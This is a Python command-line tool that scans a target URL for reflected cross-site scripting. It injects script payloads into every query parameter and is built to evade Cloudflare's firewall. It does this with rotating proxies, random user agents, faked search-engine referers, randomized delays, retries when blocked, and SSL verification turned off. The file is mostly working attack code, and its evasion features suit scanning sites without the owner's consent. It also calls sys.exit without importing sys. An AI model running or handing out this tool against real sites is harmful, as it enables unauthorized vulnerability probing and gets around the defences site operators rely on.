#!/usr/bin/env python3

import requests
import random
import time
import argparse
from fake_useragent import UserAgent
from urllib.parse import urlparse
from typing import List, Dict
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# List of proxies (you can expand this with real proxy services)
PROXY_POOL = [
    'http://proxy1:port',
    'http://proxy2:port',
    # Add more proxies here
]

# Common payloads for XSS (can be expanded)
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert('xss')>",
    "javascript:alert('xss')",
    "'><script>alert('xss')</script>",
]

# Cloudflare bypass headers
def get_random_headers() -> Dict[str, str]:
    ua = UserAgent()
    return {
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        'DNT': '1',  # Do Not Track
    }

# Randomize proxy selection
def get_random_proxy() -> Dict[str, str]:
    if not PROXY_POOL:
        return {}
    return {'http': random.choice(PROXY_POOL), 'https': random.choice(PROXY_POOL)}

# Introduce random delay to avoid rate limiting
def random_delay(min_delay: float = 1.0, max_delay: float = 5.0) -> None:
    time.sleep(random.uniform(min_delay, max_delay))

# Check if response indicates Cloudflare block
def is_cloudflare_blocked(response: requests.Response) -> bool:
    if response.status_code == 403 and 'cloudflare' in response.text.lower():
        return True
    if 'cf-ray' in response.headers or 'cf-cache-status' in response.headers:
        return True
    return False

# Main function to test XSS with Cloudflare bypass
def test_xss(target_url: str, payloads: List[str], timeout: int = 10, retries: int = 3) -> None:
    parsed_url = urlparse(target_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = dict(param.split('=') for param in parsed_url.query.split('&')) if parsed_url.query else {}

    for payload in payloads:
        attempt = 0
        while attempt < retries:
            try:
                # Randomize headers and proxy
                headers = get_random_headers()
                proxies = get_random_proxy()

                # Inject payload into parameters
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload

                # Send request
                response = requests.get(
                    base_url,
                    params=test_params,
                    headers=headers,
                    proxies=proxies,
                    timeout=timeout,
                    verify=False  # Ignore SSL verification for testing
                )

                # Check response
                if is_cloudflare_blocked(response):
                    logger.warning(f"Cloudflare block detected for payload: {payload}. Retrying...")
                    attempt += 1
                    random_delay()
                    continue

                if payload in response.text:
                    logger.info(f"Potential XSS vulnerability found with payload: {payload}")
                else:
                    logger.info(f"No XSS detected with payload: {payload}")

                break  # Exit retry loop on success

            except requests.RequestException as e:
                logger.error(f"Request failed: {e}")
                attempt += 1
                random_delay()
                if attempt == retries:
                    logger.error(f"Max retries reached for payload: {payload}")

            random_delay()  # Delay between requests

def main():
    parser = argparse.ArgumentParser(description="XSS Tester with Cloudflare WAF Bypass")
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('-r', '--retries', type=int, default=3, help='Number of retries on failure')
    args = parser.parse_args()

    logger.info(f"Starting XSS test on {args.url}")
    test_xss(args.url, XSS_PAYLOADS, args.timeout, args.retries)
    logger.info("Test completed")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Script terminated by user")
        sys.exit(0)
